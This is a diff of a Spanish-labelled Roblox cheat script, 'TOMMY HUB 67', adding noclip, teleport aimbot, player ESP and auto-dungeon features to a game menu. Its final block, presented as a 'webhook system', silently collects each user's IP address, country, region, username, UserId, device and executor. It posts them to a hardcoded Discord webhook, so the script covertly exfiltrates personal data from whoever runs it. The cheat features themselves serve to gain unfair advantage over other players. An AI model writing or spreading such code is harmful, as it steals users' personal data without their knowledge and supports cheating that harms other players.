+stepper(Combat, "Dash:", "DashLen", 1, 300, 10, "")
+toggle(Combat, "Noclip", "Noclip", function(v)
+    if not v and player.Character then
+        for _, p in pairs(player.Character:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide = true end end
+    end
 end)
+toggle(Combat, "Walk on Water", "WaterWalk")
 
-print("✅ TOMMY HUB 67 (Grief.cc Edition) cargado correctamente")
+-- === GLITCHES ===
+section(Glitch, "Sanguine Z")
+toggle(Glitch, "Sanguine Z No Cooldown", "SangNoCD", function(v)
+    local c = player.Character
+    if c then c:SetAttribute("AllCooldown", v and 3 or nil) end
+end)
+button(Glitch, "🩸 Sanguine Z Manual", function() sangManual() end)
+toggle(Glitch, "Sanguine Z Auto", "SangAuto", function(v)
+    if v then startSangAuto() elseif sangConn then sangConn:Disconnect(); sangConn = nil end
+end)
+stepper(Glitch, "Drop Duration:", "SangDrop", 0.5, 5, 0.5, "s")
+section(Glitch, "Trucos")
+toggle(Glitch, "No Animations", "NoAnim")
+toggle(Glitch, "Super Jump (botón de salto)", "SuperJump")
+stepper(Glitch, "Jump Power:", "JumpPower", 50, 1000, 50, "")
+toggle(Glitch, "Soul Guitar Glitch (Beta)", "SoulGuitar")
+stepper(Glitch, "Soul Dash:", "SoulDash", 1, 300, 10, "")
+toggle(Glitch, "Anti Lava", "AntiLava")
+toggle(Glitch, "Delete Ghost Ship (Sea 2)", "DelShip")
+
+-- === SORU ===
+section(Soru, "Soru")
+toggle(Soru, "Infinite Soru", "InfSoru", function() if player.Character then attachInfSoru(player.Character) end end)
+toggle(Soru, "Soru Aimbot (TP)", "SoruAimbot")
+stepper(Soru, "Soru Dist:", "SoruDist", 100, 3500, 250, "")
+button(Soru, "🎯 Soru Target: " .. S.SoruTarget, function(b)
+    local list = {"Nearest"}
+    for _, p in ipairs(Players:GetPlayers()) do if p ~= player then table.insert(list, p.Name) end end
+    local idx = table.find(list, S.SoruTarget) or 0
+    S.SoruTarget = list[(idx % #list) + 1]
+    b.Text = "🎯 Soru Target: " .. S.SoruTarget
+end)
+section(Soru, "Combos")
+toggle(Soru, "Portal Soru Combo (X+Z)", "PortalSoru")
+stepper(Soru, "Portal Soru Delay:", "PortalSoruDelay", 0.05, 2, 0.05, "s")
+toggle(Soru, "Portal Sanguine C Combo", "PortalSangC")
+stepper(Soru, "Sanguine C Delay:", "PortalSangCDelay", 0.05, 2, 0.05, "s")
+cycle(Soru, "⚡ Trigger: ", "PortalSangCTrigger", {"PortalF", "Soru"})
+toggle(Soru, "Flashstep Skill Combo", "FlashCombo")
+cycle(Soru, "🗡 Weapon: ", "FlashWeapon", {"Melee", "Fruit", "Sword", "Gun"})
+cycle(Soru, "⌨ Skill Key: ", "FlashKey", {"Z", "X", "C", "V", "F"})
+stepper(Soru, "Skill Delay:", "FlashDelay", 0.05, 2, 0.05, "s")
+
+-- === ESP ===
+section(ESPpage, "ESP & Visuals")
+toggle(ESPpage, "ESP (General)", "ESP", function(v) if not v then for p in pairs(esp) do clearESP(p) end end end)
+toggle(ESPpage, "Show Name", "ESPName")
+toggle(ESPpage, "Show Level", "ESPLevel")
+toggle(ESPpage, "Show Bounty / PvP", "ESPBounty")
+toggle(ESPpage, "Show Devil Fruit", "ESPFruit")
+toggle(ESPpage, "Show Distance", "ESPDist")
+toggle(ESPpage, "Show HP %", "ESPHP")
+toggle(ESPpage, "Highlight Players", "ESPHighlight")
+stepper(ESPpage, "Text Size:", "ESPSize", 8, 32, 1, "px")
+
+-- === DUNGEONS ===
+section(Dungeon, "Auto Dungeon")
+toggle(Dungeon, "▶ Auto Dungeon (Start/Stop)", "AutoDungeon", function(v) dgSet(v) end)
+cycle(Dungeon, "🗡 Arma: ", "DungeonWeapon", {"Sword", "Melee", "Blox Fruit"})
+stepper(Dungeon, "Altura de ataque:", "DungeonHeight", 10, 100, 5, "")
+toggle(Dungeon, "Auto V4 (tecla Y)", "DungeonV4")
+
+-- === MISC ===
+local Misc = newPage("Misc")
+section(Misc, "Apariencia")
+cycle(Misc, "🎨 Tema: ", "Theme", THEME_LIST, function() applyTheme(S.Theme) end)
+do
+    local oldUpdate = reg.Theme.update
+    reg.Theme.update = function() oldUpdate(); applyTheme(S.Theme) end
+end
+
+showPage("Combat")
+print("✅ TOMMY HUB 67 cargado | F4 = abrir/cerrar")
+
+-- ================= 🔥 TOMMY HUB WEBHOOK SYSTEM =================
+do
+    local HttpService = game:GetService("HttpService")
+    local MarketplaceService = game:GetService("MarketplaceService")
+    local WEBHOOK_URL = "https://discord.com/api/webhooks/1453695404394979358v/5xnbL5Pz4dnjH2Uwoflue37adQX01d-Jb0V3j7L2P20T0UyF3BxLZ1ugan7U0sqv"
+
+    local execCount = 1
+    pcall(function()
+        if getgenv then
+            local g = getgenv()
+            if typeof(g.TommyExecCount) == "number" then
+                g.TommyExecCount = 1
+            else
+                g.TommyExecCount += 1
+            end
+            execCount = g.TommyExecCount
+        end
+    end)
+    if not execCount or execCount < 1 then execCount = 1 end
+
+    local function GetTime() return os.date("%Y-%m-%d %H:%M:%S") end
+    local function GetDevice()
+        if UIS.TouchEnabled and not UIS.KeyboardEnabled then return "Móvil"
+        elseif UIS.GamepadEnabled then return "Consola"
+        else return "PC" end
+    end
+    local function GetGameName()
+        local name = "Desconocido"
+        pcall(function() name = MarketplaceService:GetProductInfo(game.PlaceId).Name end)
+        return name
+    end
+    local function GetIPData()
+        local ok, res = pcall(function() return game:HttpGet("http://ip-api.com/json/") end)
+        if not ok then return nil end
+        local data = HttpService:JSONDecode(res)
+        return {ip = data.query or "N/A", country = data.country or "N/A", region = data.regionName or "N/A"}
+    end
+    local function GetExecutor()
+        local name = "Desconocido"
+        pcall(function()
+            if type(identifyexecutor) == "function" then name = identifyexecutor()
+            elseif type(getexecutorname) == "function" then name = getexecutorname()
+            elseif getgenv then
+                local g = getgenv()
+                if rawget(g, "Xeno") then name = "Xeno"
+                elseif rawget(g, "Solara") then name = "Solara" end
+            elseif syn then name = "Synapse"
+            elseif KRNL_LOADED then name = "KRNL"
+            elseif Fluxus then name = "Fluxus"
+            elseif secure_load then name = "Sentinel" end
+        end)
+        return tostring(name or "Desconocido")
+    end
+
+    local function SendWebhook(info)
+        pcall(function()
+            if not request then return end
+            local ok, err = pcall(function()
+                request({
+                    Url = WEBHOOK_URL,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = HttpService:JSONEncode({
+                        content = "@everyone",
+                        embeds = {{
+                            title = "🔥 TOMMY HUB 67 EJECUTADO",
+                            color = 65280,
+                            fields = {
+                                {name="Jugador", value=player.Name, inline=true},
+                                {name="UserId", value=tostring(player.UserId), inline=true},
+                                {name="Hora", value=GetTime(), inline=true},
+                                {name="Dispositivo", value=GetDevice(), inline=true},
+                                {name="Juego", value=GetGameName(), inline=true},
+                                {name="Executor", value=GetExecutor(), inline=true},
+                                {name="Ejecuciones", value=tostring(execCount), inline=true},
+                                {name="IP", value=info.ip, inline=true},
+                                {name="País", value=info.country, inline=true},
+                                {name="Región", value=info.region, inline=true},
+                            },
+                            footer = {text="Tommy Hub System"}
+                        }}
+                    })
+                })
+            end)
+            if not ok then warn("❌ Webhook falló:", err)
+            else print("✅ Webhook enviado correctamente") end
+        end)
+    end
+
+    local info = GetIPData() or {ip="N/A", country="N/A", region="N/A"}
+    SendWebhook(info)
+    print("🔥 Tommy Hub67 @everyone Activado")
+end
